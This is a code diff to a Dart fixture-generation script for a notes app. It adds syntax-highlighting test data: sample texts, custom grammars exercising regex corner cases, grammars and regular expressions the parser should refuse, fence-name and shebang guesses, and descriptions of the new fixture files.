+        '%YAML 1.2\n---\n# config 😀\nname: Old Brain Fix\nversion: 0.7.0\n'
+        'list:\n  - "quoted \\n"\n  - \'single\'\n  - &anchor 42\nref: *anchor\n'
+        'flag: true\nblock: |\n  text\n  more\n',
+    'text.xml':
+        '<?xml version="1.0"?>\n<!-- note 😀 -->\n<root a="1" b=\'2\'>\n'
+        '  <item>Tom &amp; Jerry</item>\n  <![CDATA[ <raw> ]]>\n  <br/>\n</root>\n',
+    'source.css':
+        '/* theme 😀 */\n@media (max-width: 600px) {\n  body > .main #id {\n'
+        '    color: #fff;\n    margin: 0 auto 1.5em;\n    font-family: "Inter", sans-serif;\n  }\n}\n',
+    'text.html.markdown':
+        '# Title\n\nSome *em* and **strong** text with `code` 😀.\n\n'
+        '> quoted\n\n- item\n1. first\n\n```rust\nfn x() {}\n```\n\n'
+        '[link](https://example.org) and ## not heading\n## Second\n',
+  };
+  final grammars = Grammars.builtIn;
+  // Grammars made for the subset's corners.
+  final corners = <(String, String, String)>[
+    (
+      'captures in alternatives, a prototype and meta scopes',
+      'name: Corners\nscope: source.corners\ncontexts:\n'
+          '  prototype:\n    - match: \'#.*\'\n      scope: comment.line\n'
+          '  main:\n'
+          '    - match: \'(?:(let)|(var))\\s+(\\w+)\'\n'
+          '      captures:\n        1: keyword.let\n        2: storage.type.var\n'
+          '        3: variable.parameter\n'
+          '    - match: \'"\'\n      push: string\n'
+          '  string:\n    - meta_scope: string.quoted\n'
+          '    - meta_content_scope: meta.inside\n'
+          '    - match: \'\\\\.\'\n      scope: constant.character.escape\n'
+          '    - match: \'"\'\n      pop: true\n',
+      'let a = "x\\"y" # c\nvar éb = 1\nlet\tc\n"open\nstill"',
+    ),
+    (
+      '(?i), (?x), \\b and . on non-ASCII, \$ before the break, set and anonymous contexts',
+      'name: Flags\nscope: source.flags\nvariables:\n  id: \'[a-z_]\\w*\'\n'
+          '  call: \'{{id}}(?=\\()\'\ncontexts:\n  main:\n'
+          '    - match: \'(?i)\\bselect\\b\'\n      scope: keyword.sql\n'
+          '    - match: |\n        (?x)\n        \\b (end) \\s* \\# \\s* (\\d+) # trailing\n'
+          '      captures:\n        1: keyword.end\n        2: constant.numeric\n'
+          '    - match: \'{{call}}\'\n      scope: variable.function\n'
+          '    - match: \'\\w+\$\'\n      scope: entity.name.type\n'
+          '    - match: \'<\'\n      set:\n        - meta_scope: entity.name.tag\n'
+          '        - match: \'>\'\n          set: main\n'
+          '    - match: \'(?<=:)\\d\'\n      scope: constant.numeric\n'
+          '    - match: \'.\\.\'\n      scope: keyword.operator\n',
+      'SeLeCt éselect selectx select\nEND # 42 f(x) g (y)\nlast word\r\n'
+          'tail\n<tag a> after\na:1 b:2 ä.x 😀.y\n',
+    ),
+    (
+      'empty matches that push and pop, and a line too long',
+      'name: Empty\nscope: source.empty\ncontexts:\n  main:\n'
+          '    - match: \'(?=[A-Z])\'\n      push: upper\n'
+          '    - match: \'\\d+\'\n      scope: constant.numeric\n'
+          '  upper:\n    - match: \'[A-Z]+\'\n      scope: support.type\n'
+          '    - match: \'(?=[^A-Z])\'\n      pop: true\n',
+      'ab CD 12 EFg\n${'1 ' * 2600}\nXY 7\n',
+    ),
+  ];
+  corners.add((
+    'a zero-width match never falls between the halves of a 😀',
+    'name: Pairs\nscope: source.pairs\ncontexts:\n  main:\n'
+        '    - match: \'"\'\n      push: string\n'
+        '    - match: \'(?<=😀)\'\n      push: after\n'
+        '  string:\n    - meta_scope: string.quoted\n'
+        '    - match: \'"|\$\'\n      pop: true\n'
+        '  after:\n    - match: \'\\w+\'\n      scope: keyword\n      pop: true\n',
+    '"a 😀 b" x 😀y 😀\n"😀😀\n',
+  ));
+  corners.add((
+    'a lookbehind of one fixed width with lookarounds and \\b inside it '
+        '(obf-1037)',
+    'name: Behind\nscope: source.behind\ncontexts:\n  main:\n'
+        '    - match: \'(?<=\\b[a-z])\\d+\'\n      scope: constant.numeric\n'
+        '    - match: \'(?<=(?!q)[a-z]{2})!\'\n      scope: keyword\n'
+        '    - match: \'(?<!(?<=x)y)z\'\n      scope: string\n'
+        '    - match: \'(?<=ab|cd)e\'\n      scope: entity.name.function\n',
+    'a12 ab3 _4 é5 ab! qa! qq! xyz yz z abe cde xbe\n😀a7 a😀8\n',
+  ));
+  final cornerSamples = <Object>[];
+  for (final (about, source, text) in corners) {
+    final g = Grammar.parse(source);
+    cornerSamples.add({
+      'about': about,
+      'grammar': source,
+      'text': text,
+      'spans': spans(g, text),
+    });
+  }
+  const refusedGrammars = <(String, String)>[
+    ('not YAML', 'name: [x\n'),
+    ('no contexts', 'name: X\nscope: source.x\n'),
+    ('no main', 'name: X\nscope: source.x\ncontexts:\n  other: []\n'),
+    (
+      'embed',
+      'name: X\nscope: source.x\ncontexts:\n  main:\n'
+          '    - match: a\n      embed: scope:source.y\n      escape: b\n',
+    ),
+    (
+      'branch_point',
+      'name: X\nscope: source.x\ncontexts:\n  main:\n'
+          '    - match: a\n      branch_point: p\n      branch: [x]\n',
+    ),
+    (
+      'extends',
+      'name: X\nscope: source.x\nextends: Packages/Y.sublime-syntax\ncontexts:\n  main: []\n',
+    ),
+    (
+      'include of another grammar',
+      'name: X\nscope: source.x\ncontexts:\n  main:\n    - include: scope:source.y\n',
+    ),
+    (
+      'pop: 2',
+      'name: X\nscope: source.x\ncontexts:\n  main:\n    - match: a\n      pop: 2\n',
+    ),
+    (
+      'a capture past the groups',
+      'name: X\nscope: source.x\ncontexts:\n  main:\n'
+          '    - match: (a)\n      captures:\n        2: keyword\n',
+    ),
+    (
+      'an unknown variable',
+      'name: X\nscope: source.x\ncontexts:\n  main:\n    - match: \'{{nope}}\'\n',
+    ),
+    (
+      'a variable that refers to itself',
+      'name: X\nscope: source.x\nvariables:\n  a: \'{{a}}x\'\ncontexts:\n'
+          '  main:\n    - match: \'{{a}}\'\n',
+    ),
+    (
+      'a match that is a number',
+      'name: X\nscope: source.x\ncontexts:\n  main:\n    - match: 12\n',
+    ),
+    // YAML both libraries must read alike (obf-1037).
+    (
+      'a key twice',
+      'name: X\nname: Y\nscope: source.x\ncontexts:\n  main: []\n',
+    ),
+    (
+      'two documents',
+      'name: X\nscope: source.x\ncontexts:\n  main: []\n---\nname: Y\n',
+    ),
+    (
+      'one document between markers',
+      '---\nname: X\nscope: source.x\ncontexts:\n  main: []\n...\n',
+    ),
+    (
+      'anchors and aliases',
+      'name: &n X\nscope: source.x\nvariables:\n  a: &v b\n  c: *v\n'
+          'contexts:\n  main:\n    - match: \'{{c}}\'\n      scope: *n\n',
+    ),
+    (
+      'a tag of a text',
+      'name: !!str 12\nscope: source.x\ncontexts:\n  main: []\n',
+    ),
+    ('a name yes', 'name: yes\nscope: source.x\ncontexts:\n  main: []\n'),
+    ('a name 0o7', 'name: 0o7\nscope: source.x\ncontexts:\n  main: []\n'),
+    ('a name 1_000', 'name: 1_000\nscope: source.x\ncontexts:\n  main: []\n'),
+    ('a name null', 'name: ~\nscope: source.x\ncontexts:\n  main: []\n'),
+    (
+      'a flow mapping',
+      '{name: X, scope: source.x, contexts: {main: [{match: "a", scope: k}]}}\n',
+    ),
+    (
+      'a block text',
+      'name: X\nscope: source.x\ncontexts:\n  main:\n'
+          '    - match: |\n        a\n      scope: keyword\n',
+    ),
+  ];
+  final refused = <Object>[
+    for (final (about, source) in refusedGrammars)
+      {'about': about, 'grammar': source, 'refused': _refuses(source)},
+  ];
+  const regexes = [
+    r'a*+',
+    r'a++',
+    r'a?+',
+    r'a{2}+',
+    r'(?>a)',
+    r'(?<n>a)',
+    r'(a)\1',
+    r'\k<n>',
+    r'(?i:a)',
+    r'a(?i)b',
+    r'(?s).',
+    r'(?m)^a',
+    r'\Ga',
+    r'\Aa',
+    r'a\z',
+    r'a\Z',
+    r'\h',
+    r'\p{L}',
+    r'[[:alpha:]]',
+    r'[a&&b]',
+    r'(?:(a))*',
+    r'(a)+',
+    r'(?=(a))',
+    r'(?<=(a))b',
+    r'^*',
+    r'\b+',
+    r'(?=a)*',
+    r'*a',
+    r'a{,2}',
+    r'a{3,2}',
+    r'(a',
+    r'a)',
+    r'[a',
+    r'[b-a]',
+    r'[\W]',
+    r'\q',
+    r'\x4',
+    r'\x{110000}',
+    r'\uD800',
+    r'(?#comment)',
+    r'(?(1)a|b)',
+    // and what is read
+    r'(?x) a b # c',
+    r'(?i)(?x)AbC',
+    r'(?xi)abc',
+    r'a{2}b{1,}c{1,3}?',
+    r'[]a]',
+    r'[^]a]',
+    r'[a-]',
+    r'\x41\x{1F600}\u00e9\e\a\t',
+    r'\.\(\)\[\]\{\}\/\-\#\ ',
+    r'a{b',
+    r'{',
+    r'(?<=ab|c)d(?<!x+)',
+    r'(?:(a)|(b))c',
+    // lookbehinds (obf-1037): of one fixed width only
+    r'(?<=a+)b',
+    r'(?<=a{1,2})b',
+    r'(?<=(?:a|bc))d',
+    r'(?<=x{1001})y',
+    r'(?<=ab|cd)e',
+    r'(?<=a{3}(?:bc){2})d',
+    r'(?<=\b(?=x)[a-z])y',
+    r'(?<=(?<!q)😀)z',
+    r'(?<=x{1000})y',
+  ];
+  return {
+    'grammars': [
+      for (final g in grammars.all)
+        {'name': g.name, 'scope': g.scope, 'fenceNames': g.fileExtensions},
+    ],
+    'samples': [
+      for (final g in grammars.all)
+        {
+          'scope': g.scope,
+          'text': samples[g.scope] ?? '',
+          'spans': spans(g, samples[g.scope] ?? ''),
+        },
+    ],
+    'corners': cornerSamples,
+    'fences': [
+      for (final name in [
+        'rs',
+        'Rust',
+        'RUST',
+        'py',
+        'bash',
+        'sh',
+        'zsh',
+        'ts',
+        'tsx',
+        'javascript',
+        'c++',
+        'cpp',
+        'h',
+        'kt',
+        'yml',
+        'html',
+        'svg',
+        'md',
+        'jsonc',
+        'golang',
+        'dart',
+        'java',
+        'css',
+        'sql',
+        ' go ',
+        '',
+        'cobol',
+        'rust,ignore',
+      ])
+        {'name': name, 'scope': grammars.forFence(name)?.scope},
+    ],
+    'guesses': [
+      for (final text in [
+        '#!/bin/bash\necho hi',
+        '#!/usr/bin/env bash\n',
+        '#!/bin/sh -e\n',
+        '#!/usr/bin/env python3\nprint(1)',
+        '#!/usr/bin/python\n',
+        '#!/usr/bin/env node\n',
+        '\n\n  \npackage main\n\nfunc main() {}',
+        '<?xml version="1.0"?>\n<a/>',
+        '<!DOCTYPE html>\n<html>',
+        '%YAML 1.2\n---\n',
+        'fn main() {\n}\n',
+        'plain words\nmore words',
+        '',
+        '#!/bin/bash\r\necho',
+      ])
+        {'text': text, 'scope': grammars.guess(text)?.scope},
+    ],
+    'refused': refused,
+    'regexes': [
+      for (final r in regexes) {'regex': r, 'refused': _regexRefused(r)},
+    ],
+  };
+}
+
+bool _refuses(String source) {
+  try {
+    Grammar.parse(source);
+    return false;
+  } on GrammarRefused {
+    return true;
+  }
+}
+
+bool _regexRefused(String regex) {
+  try {
+    CodeRegex.parse(regex);
+    return false;
+  } on GrammarRefused {
+    return true;
+  }
 }
 
 /// Formatted text (ADR 0033): for each text its lines and their parts,
@@ -10984,8 +11978,9 @@ Future<void> main(List<String> args) async {
     'ends by COUNT and UNTIL, timed and all-day events and titles that '
     'need escaping and folding; the list of all of them by name, and '
     'names as typed in that order.\n'
-    '- `routines/alarms.json`: the Agenda, alarm plan, Missed Summary and '
-    'Nudge of the `routines` log at held moments with this Device\'s '
+    '- `routines/alarms.json`: the Agenda, alarm plan, Heads-ups, Missed '
+    'Summary and Nudge of the `routines` log at held moments with this '
+    'Device\'s '
     'settings, and of each Note the Occurrence due or Missed of each of '
     'its Routines and what its card ticks today, on the same clock.\n'
     '- `not-today/not_today.json`: what the Routines of the `not-today` '
@@ -10994,6 +11989,12 @@ Future<void> main(List<String> args) async {
     'alarm plan, the Missed Summary, what each Note asks to check off, '
     'what the notifications may close and each Routine\'s history, its '
     'Streaks and its Adherence with the skips beside it.\n'
+    '- `quiet-day/quiet_day.json`: what the `quiet-day` log comes to '
+    '(obf-1044): the quiet days read, and at held moments the quiet '
+    'stretch now lies in, the Agenda, the alarm plan, the Heads-ups, the '
+    'Nudge, the Missed Summary, what each Note asks to check off, what the '
+    'notifications may close and each Routine\'s history, with what a '
+    'quiet day left undone counted as skipped.\n'
     '- `markers/markers.json`: what the values of a later version in the '
     '`markers` log come to (ADR 0034): the Routines read and those whose '
     'schedule needs a newer version, by Note too, the people of the '
@@ -11030,6 +12031,11 @@ Future<void> main(List<String> args) async {
     'choice (#219) and whether the choice applies to it.\n'
     '- `features/features.json`: whether the first entries of the '
     '`features` log, as many as each read gives, read as Advanced.\n'
+    '- `added-grammars/added_grammars.json`: after the first entries of '
+    'the `added-grammars` log, as many as each read gives, the scopes of '
+    'the grammars in the order the language picker shows them, the names '
+    'of the person\'s own ones by scope, and the scope each of the fences '
+    '`cbl`, `rs`, `rust` and `zz` names (obf-1037).\n'
     '- `area-order/area_order.json`: the ids of the Areas in the person\'s '
     'own order after the first entries of the `area-order` log, as many as '
     'each read gives.\n'
@@ -11106,6 +12112,12 @@ Future<void> main(List<String> args) async {
     'made it and whether this Device may use its text again.\n'
     '- `import/import.json`: what each Import of the `import` log came to '
     '(ADR 0036): the Area made, the Notes made and the files skipped.\n'
+    '- `import-formats/`: the documents the Import of its log took, as '
+    'they lie in a folder (`inputs/`), and for each, in the order handed '
+    'over, its name, when it was last changed and, for AsciiDoc, Org, '
+    'reStructuredText and HTML, the title and the Markdown the core reads '
+    'it as (`documents.json`, #348); `import-formats.json` what the Import '
+    'came to.\n'
     '- `keep/keep.json`: the same of the import from Google Keep of the '
     '`keep` log: the Area made, the Notes, Checklists and photos made, '
     'and what was skipped, by reason.\n'
@@ -11185,6 +12197,13 @@ Future<void> main(List<String> args) async {
     'levels, each tag as written most often with its count of Notes, and '
     'the suggestions for what is typed; both again with one Area closed '
     '(`closed`), its Notes and those merged into them left out.\n'
+    '- `backlinks.json`: the Notes that link to a Note (obf-1035): Notes '
+    'captured in a fresh store, plain, formatted and as code, some filed '
+    'into two Areas, with Amends, Merges and one trashed, their texts '
+    'holding app links to other Notes and to themselves, in a table, in '
+    'bold, in code, with the scheme in capitals and an id %-encoded; for '
+    'each Note the Notes linking to it, newest first, and again with one '
+    'Area closed (`closed`).\n'
     '- `file_texts.json`: the texts of attached files (ADR 0047): for each '
     'file its name, media type and bytes, the kind it is and what reading '
     'it gives: Word documents, workbooks, OpenDocument texts and '
@@ -11226,6 +12245,16 @@ Future<void> main(List<String> args) async {
     'shebang, lines of code punctuation or indented, and lists, prose, '
     'Markdown and short texts that do not. Offsets are counted in '
     'code points.\n'
+    '- `highlight.json`: code coloured by its language (obf-1036, ADR '
+    '0054): the built-in grammars by name, scope and fence names; for '
+    'each a text with what each part is coloured, astral characters, '
+    'tabs and `\\r\\n` among them, and the same for grammars made for '
+    'the subset\'s corners (captures inside alternatives, `(?i)`, `(?x)`, '
+    'ASCII-only `\\w`, `\\b` and `.`, a `\$` before the line break, '
+    'push, set, pop, prototypes, meta scopes, anonymous contexts and '
+    'too long lines); which fence names and pasted first lines name '
+    'which grammar; and which grammars and regular expressions are '
+    'refused. Offsets are counted in code points.\n'
     '- `folder/`: two Devices that met once, so the joiner holds the '
     'host\'s keys; the host wrote more since, a new Area among it, and '
     'synced through the shared folder: both logs with their blobs and the '
@@ -11457,10 +12486,18 @@ Future<void> main(List<String> args) async {
   );
   _write(File('${root.path}/tag_tree.json'), '${_json.convert(_tagTree())}\n');
   _write(
+    File('${root.path}/backlinks.json'),
+    '${_json.convert(_backlinks())}\n',
+  );
+  _write(
     File('${root.path}/file_texts.json'),
     '${_json.convert(_fileTexts())}\n',
   );
   _write(File('${root.path}/markdown.json'), '${_json.convert(_markdown())}\n');
+  _write(
+    File('${root.path}/highlight.json'),
+    '${_json.convert(_highlight())}\n',
+  );
   _write(
     File('${root.path}/schedule_sentences.json'),
     '${_json.convert(_scheduleSentences())}\n',
@@ -11523,6 +12560,12 @@ Future<void> main(List<String> args) async {
           '${_json.convert(_notToday(store))}\n',
         );
       }
+      if (scenario.name == 'quiet-day') {
+        _write(
+          File('${out.path}/quiet_day.json'),
+          '${_json.convert(_quietDay(store))}\n',
+        );
+      }
       if (store.entitiesOfType(FrogKeys.typeFrog).isNotEmpty) {
         _write(
           File('${out.path}/frogs.json'),
@@ -11562,7 +12605,20 @@ Future<void> main(List<String> args) async {
           '${_json.convert(_noteHistory(store))}\n',
         );
       }
-      if (scenario.name == 'import' || scenario.name == 'keep') {
+      if (scenario.name == 'import-formats') {
+        for (final (name, _, text) in _documents) {
+          File('${out.path}/inputs/$name')
+            ..parent.createSync(recursive: true)
+            ..writeAsBytesSync(_bytesOf(text));
+        }
+        _write(
+          File('${out.path}/documents.json'),
+          '${_json.convert({'documents': _documentsRead()})}\n',
+        );
+      }
+      if (scenario.name == 'import' ||
+          scenario.name == 'import-formats' ||
+          scenario.name == 'keep') {
         _write(
           File('${out.path}/${scenario.name}.json'),
           '${_json.convert({'imports': _imported.map(_summary).toList()})}\n',
@@ -11572,6 +12628,12 @@ Future<void> main(List<String> args) async {
         _write(
           File('${out.path}/features.json'),
           '${_json.convert({'reads': _featureReads})}\n',
+        );
+      }
+      if (scenario.name == 'added-grammars') {
+        _write(
+          File('${out.path}/added_grammars.json'),
+          '${_json.convert({'reads': _addedGrammarReads})}\n',
         );
       }
       if (scenario.name == 'area-order') {
